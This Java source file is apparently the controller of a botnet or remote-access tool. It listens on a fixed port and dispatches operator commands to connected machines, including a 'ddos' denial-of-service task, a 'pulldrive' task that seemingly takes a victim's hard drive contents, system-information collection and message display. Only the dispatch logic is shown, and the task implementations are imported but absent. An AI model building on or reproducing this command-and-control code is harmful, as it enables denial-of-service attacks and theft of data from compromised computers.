package Server;

import Server.Tasks.DenialOfService.DenialOfServiceTask;
import Server.Tasks.DisplayMessage.DisplayMessageTask;
import Server.Tasks.PullHardDrive.PullHardDriveTask;
import Server.Tasks.SystemInformation.SystemInformationTask;
import java.util.Scanner;

public class Server {

  private static final int DEFAULT_PORT = 4562;

  private static int port;

  private static void setUp(String[] args) {
    if (args.length == 0) {
      port = DEFAULT_PORT;
      return;
    }
  }

  public static void main(String[] args) {
    setUp(args);

    ServerThread serverThread = new ServerThread(port);
    serverThread.start();

    inputLoop(serverThread);
  }

  private static void inputLoop(ServerThread serverThread) {
    Scanner scanner = new Scanner(System.in);

    while (true) {
      Task newTask = commandParsing(scanner);
      serverThread.addTask(newTask);
    }
  }

  private static Task commandParsing(Scanner scanner) {
    String command = scanner.next();

    switch (command) {
      case "sysinfo":
        return SystemInformationTask.buildFromScanner(scanner);
      case "ddos":
        return DenialOfServiceTask.buildFromScanner(scanner);
      case "display":
        return DisplayMessageTask.buildFromScanner(scanner);
      case "pulldrive":
        return PullHardDriveTask.buildFromScanner(scanner);
      default:
        return null;
    }
  }

}
